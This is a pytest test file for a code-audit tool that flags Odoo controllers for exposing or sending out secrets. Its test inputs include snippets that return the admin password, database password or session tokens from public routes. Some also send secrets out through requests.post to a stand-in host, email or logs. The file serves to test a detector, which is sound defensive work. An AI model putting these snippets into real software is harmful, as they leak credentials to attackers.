"""CODE-AUDIT-14: REVIEW-CODE-AUDIT-11 (5H/4M/2L). Rule: a sink is safe only when provably bounded
and non-sensitive; anything unprovable is HIGH. Each finding: review probe, neighbours, benign twin."""
import pytest

from tests.test_nf_bot_code_audit_11 import _m, _sev, _js, P, O

CH = "from odoo import http\nfrom odoo.http import request\nimport os\nfrom odoo.tools import config\n\n\nclass C(http.Controller):\n"


def _ctl(body, auth="public"):
    return {"controllers/c.py": CH + f"    @http.route('/p', auth='{auth}', type='http')\n    def p(self, **kw):\n"
            + "".join("        " + ln + "\n" for ln in body.split("\n"))}


# ---------------------------------------------------------------- H1 secret sources
@pytest.mark.parametrize("body", [
    "k = 'database.' + 'secret'\nreturn request.env['ir.config_parameter'].sudo().get_param(k)",  # review probes
    "return request.env['ir.config_parameter'].sudo().get_param(kw.get('k'))",
    "return config['admin_passwd']",
    "return config.get('db_password')",
    "return os.environ.get('ODOO_DB_PASSWORD', '')",
    "return request.session.sid",
    "v = os.environ['X_' + kw.get('n', '')]\nreturn v",  # neighbours
    "t = request.session.session_token\nreturn {'t': t}",
    "x = os.getenv(kw['k'])\nreturn x or ''",
    "request.env['ir.config_parameter'].sudo().get_param(kw['k'])\nreturn 'ok'",
])
def test_h1_route_secret_high(body):
    assert "high" in _sev(_ctl(body), "route-secret-read")


def test_h1_authenticated_route_returning_secret_high():
    assert "high" in _sev(_ctl("return config['admin_passwd']", auth="user"), "route-secret-read")


@pytest.mark.parametrize("body", [
    "pw = config['admin_passwd']\nself.env['mail.mail'].create({'body_html': pw, 'email_to': 'a@b'})",
    "self.env['mail.mail'].create({'body_html': os.environ.get('ODOO_DB_PASSWORD')})",
    "import requests\nrequests.post('http://e', data={'k': config.get('db_password')})",
    "_logger.info('pw %s', config['admin_passwd'])",
    "k = self.env['ir.config_parameter'].sudo().get_param(self.name)\nself.message_post(body=k)",
])
def test_h1_secret_exfiltration_high(body):
    pre = "import os, logging\nfrom odoo.tools import config\n_logger = logging.getLogger(__name__)\n"
    assert "high" in _sev(_m(body, pre), "secret-exfiltration")


@pytest.mark.parametrize("body", [
    "return request.env['ir.config_parameter'].sudo().get_param('website.cookie_bar') or ''",
    "return os.environ.get('TZ', '')",
    "return config.get('addons_path', '')",
])
def test_h1_non_secret_constant_silent(body):
    assert "high" not in _sev(_ctl(body), "route-secret-read")


def test_h1_named_key_logged_high_but_sent_to_its_api_ok():
    pre = "import logging, requests\n_logger = logging.getLogger(__name__)\n"
    k = "k = self.env['ir.config_parameter'].sudo().get_param('x.api_key')\n"
    assert "high" in _sev(_m(k + "_logger.info('k %s', k)", pre), "secret-exfiltration")
    assert "high" not in _sev(_m(k + "requests.get('https://api.x', params={'key': k})", pre), "secret-exfiltration")
